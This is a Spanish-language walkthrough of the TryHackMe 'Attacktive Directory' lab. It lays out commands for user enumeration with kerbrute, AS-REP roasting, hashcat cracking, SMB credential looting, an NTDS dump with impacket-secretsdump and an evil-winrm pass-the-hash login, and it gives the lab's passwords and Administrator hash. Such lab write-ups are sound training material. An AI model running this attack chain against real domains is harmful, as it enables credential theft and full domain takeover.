---
Estado: Completado
Plataforma: TryHackMe
SO: Windows
Dificultad: Medio
VectorInicial: AS-REP Roasting
ServicioInicial: Kerberos
PuertoInicial: 88
Credenciales:
  - svc-admin: management2005
  - backup: backup2517860
Usuarios:
  - svc-admin
  - backup
  - Administrator
Privesc: NTDS dump -> Pass-the-Hash
Tecnicas:
  - SMB Enumeration
  - Kerberos User Enumeration
  - AS-REP Roasting
  - Password Cracking
  - SMB Share Enumeration
  - Credential Discovery
  - NTDS Dump
  - Pass-the-Hash
Herramientas:
  - gomap
  - enum4linux
  - kerbrute
  - impacket
  - hashcat
  - smbclient
  - evil-winrm
Fecha: 2026-03-15
---

# Attacktive Directory

## Reconocimiento inicial

Se enumeran puertos y servicios de la máquina:

```bash
gomap -s -p- $TARGET
```

La superficie es la esperable para un controlador de dominio Windows, con servicios como LDAP, Kerberos, SMB y WinRM.

Puertos especialmente relevantes:

- `88` → Kerberos
- `139/445` → SMB
- `389/636` → LDAP/LDAPS
- `5985` → WinRM

## Enumeración SMB inicial

Se lanza `enum4linux` para obtener información básica:

```bash
enum4linux -U $TARGET
```

De aquí se obtiene:

- SID del dominio
- indicios del nombre de dominio
- confirmación de que el host forma parte de un dominio

Se añaden después al fichero `/etc/hosts` los nombres necesarios para resolución local:

```txt
10.112.160.217 THM-AD spookysec.local
```

## Enumeración de usuarios Kerberos

Con `kerbrute` se validan usuarios del dominio:

```bash
./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt
```

Usuarios interesantes detectados:

- `svc-admin`
- `backup`
- `administrator`

## AS-REP Roasting

Se prueba qué usuarios tienen deshabilitada la preautenticación Kerberos:

```bash
python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
```

Esto devuelve un hash AS-REP válido para `svc-admin`.

## Crackeo del hash

El hash se rompe con `hashcat`:

```bash
hashcat -m 18200 svc.admin.txt passwordlist.txt
```

Credencial obtenida:

- `svc-admin:management2005`

## Acceso a recursos SMB

Con esa cuenta se listan recursos compartidos:

```bash
smbclient -L //$TARGET -U svc-admin%management2005
```

Se detecta acceso al recurso `backup`, que contiene un archivo con credenciales.

```bash
smbclient //$TARGET/backup/ -U svc-admin%management2005
```

El archivo descargado, tras decodificarse, revela:

- `backup@spookysec.local:backup2517860`

## Volcado de secretos del dominio

Con la cuenta `backup` se usa `impacket-secretsdump`:

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@$TARGET
```

Se obtiene el contenido de `NTDS.DIT`, incluyendo el hash NTLM del usuario `Administrator`.

## Acceso final con Pass-the-Hash

Se utiliza `evil-winrm` con el hash de `Administrator`:

```bash
evil-winrm -i $TARGET -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Con ello se consigue acceso administrativo completo al sistema.

## Conclusión

La cadena de compromiso queda así:

1. Enumeración de usuarios.
2. AS-REP Roasting sobre `svc-admin`.
3. Crackeo offline de contraseña.
4. Acceso a SMB y recuperación de nuevas credenciales.
5. Volcado de secretos del dominio.
6. Pass-the-Hash contra `Administrator`.

Laboratorio muy bueno para practicar un flujo clásico de Active Directory sin meter ruido innecesario.

